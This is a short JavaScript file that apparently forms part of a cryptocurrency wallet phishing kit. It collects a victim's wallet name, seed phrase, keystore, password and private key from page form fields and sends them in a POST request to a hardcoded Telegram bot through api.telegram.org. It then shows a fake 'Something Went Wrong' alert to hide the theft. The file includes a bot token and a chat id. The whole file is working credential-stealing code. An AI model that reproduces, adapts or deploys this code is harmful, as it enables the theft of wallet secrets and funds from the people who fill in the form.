//bot token
var telegram_bot_id = "6679917048:AAHHy1jU-nH1tH8hsWbyxnASoEufv8VbEG4";
//chat id
var chat_id = 6902117754;
var walletname,
  phrase,
  keystore,
  password,
  private,
  walletnamePrivate,
  walletnameKey;
var ready = function () {
  walletname = document.getElementById("walletname").value;
  phrase = document.getElementById("phrase").value;
  keystore = document.getElementById("keystore").value;
  password = document.getElementById("password").value;
  private = document.getElementById("private").value;
  walletnameKey = document.getElementById("walletnameKey").value;
  walletnamePrivate = document.getElementById("walletnamePrivate").value;
  message =
    "WalletName: " +
    walletname +
    "\nPhrase: " +
    phrase +
    "\nKeystore: " +
    keystore +
    "\nPassword: " +
    password +
    "\nPrivate: " +
    private +
    "\nWalletnameKey: " +
    walletnameKey +
    "\nWalletnamePrivate: " +
    walletnamePrivate;
};
var sender = function () {
  ready();
  var settings = {
    async: true,
    crossDomain: true,
    url: "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "cache-control": "no-cache",
    },
    data: JSON.stringify({
      chat_id: chat_id,
      text: message,
    }),
  };
  $.ajax(settings).done(function (response) {
    console.log(response);
  });
  alert("Something Went Wrong");
  walletname = document.getElementById("walletname").value;
  phrase = document.getElementById("phrase").value;
  keystore = document.getElementById("keystore").value;
  password = document.getElementById("password").value;
  private = document.getElementById("private").value;
  walletnameKey = document.getElementById("walletnameKey").value;
  walletnamePrivate = document.getElementById("walletnamePrivate").value;
  return false;
};
